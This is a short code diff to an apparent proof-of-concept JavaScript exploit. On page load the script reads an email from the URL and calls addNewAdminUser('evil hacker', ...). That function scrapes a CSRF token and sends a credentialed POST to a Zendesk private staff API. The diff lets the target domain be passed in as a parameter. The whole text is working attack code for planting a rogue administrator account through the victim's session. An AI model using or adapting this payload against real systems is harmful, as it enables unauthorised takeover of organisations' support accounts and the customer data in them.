@@ -2,6 +2,7 @@ const params = new URLSearchParams( document.location.search );
 
 const newEmail = params.get( 'email' );
 const subdomain = params.get( 'subdomain' );
+const domain = params.get( 'domain' ) || 'zendesk.com'
 
 ( async function() {await addNewAdminUser( 'evil hacker', newEmail );})()
 
@@ -25,7 +26,7 @@ async function addNewAdminUser( name, email ) {
     const parsedHtml = await _getParsedHtmlFromUrl( url );
     const csrfToken = _getCsrfToken( parsedHtml );
 
-    const response = await fetch( `https://${ subdomain }.zendesk.com/api/admin/private/staff`, { 
+    const response = await fetch( `https://${ subdomain }.${domain}/api/admin/private/staff`, { 
         method: 'POST',
         withCreds: true ,
         headers:{
